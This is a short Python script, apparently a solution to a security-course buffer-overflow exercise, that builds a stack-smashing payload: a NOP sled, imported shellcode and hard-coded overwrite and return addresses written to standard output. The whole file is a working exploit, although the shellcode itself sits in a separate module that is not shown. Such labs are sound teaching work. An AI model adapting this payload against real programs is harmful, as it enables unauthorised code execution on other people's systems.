import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
addr =  pack('<I', 0xfff6e738)
retAddr =  pack('<I', 0x804a20e)
slide = b'\x90'*(2056- len(shellcode))

payload =  slide + shellcode + addr + retAddr

# Launch the attack!
sys.stdout.buffer.write(payload)
